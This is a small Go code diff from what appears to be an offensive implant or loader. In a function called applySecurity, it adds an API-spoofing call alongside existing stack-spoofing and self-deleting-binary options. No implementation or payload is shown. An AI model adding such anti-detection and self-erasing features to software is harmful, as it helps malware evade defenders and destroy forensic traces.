@@ -226,6 +226,7 @@ func applySecurity() {
 	}
 	if stackSpoof == "true" {
 		initStackSpoof()
+		initAPISpoofing()
 	}
 	if selfDelete == "true" {
 		selfDeleteBinary()
